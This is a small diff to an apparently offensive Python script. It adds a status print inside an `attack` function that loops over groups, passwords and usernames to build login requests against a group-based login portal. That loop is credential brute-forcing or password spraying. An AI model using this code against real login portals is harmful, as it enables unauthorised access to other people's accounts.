@@ -108,6 +108,7 @@ def attack(target, usernames, passwords, groups, rate):
 		timeout = rate
 
 	for group in groups:
+		printf("{Fore.BLUE}> {Fore.YELLOW}[*]{Fore.YELLOW} Group: {group}")
 		for password in passwords:
 			for username in usernames:
 				data = f"tgroup=&next=&tgcookieset=&group_list={group}&username={username}&password={password}&Login=Login"
